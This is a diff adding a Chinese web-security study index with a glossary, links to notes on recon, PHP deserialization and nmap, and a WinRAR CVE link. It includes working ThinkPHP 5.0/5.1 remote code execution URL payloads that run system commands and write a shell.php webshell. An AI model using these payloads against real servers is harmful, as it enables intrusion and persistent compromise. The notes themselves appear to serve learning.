@@ -1,0 +1,36 @@
+# web安全
+
+## 安全的常用术语
+
+- vul：vulnerable：漏洞
+- payload：ShellCode中的主要功能代码
+- POC：Proof ofConcept：漏洞证明
+- EXP：Exploit：漏洞利用
+- CVE漏洞编号：Common Vulnerabilities & Exposures 公开的漏洞
+- XSS Cheat Sheet: xss备忘单
+
+## [信息收集](./1信息收集/信息收集.html)
+
+## 常见漏洞
+
+- [PHP反序列化](./2漏洞/PHP反序列化漏洞.html)
+
+## 工具
+
+- [nmap](./3工具/nmap.html)
+
+## ThinkPHP5.0和5.1版本远程代码执行分析
+
+```poc
+5.0版本POC（不唯一）:
+?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+命令执行：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=[系统命令]
+文件写入：?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][1]=<?php phpinfo();?>
+
+5.1版本POC（不唯一）
+?s=index/\think\Request/input&filter=phpinfo&data=1
+命令执行：?s=index/\think\Request/input&filter=system&data=[系统命令]
+文件写入：?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
+```
+
+- [WinRAR目录穿越漏洞（CVE-2018-20250）](https://github.com/WyAtu/CVE-2018-20250)
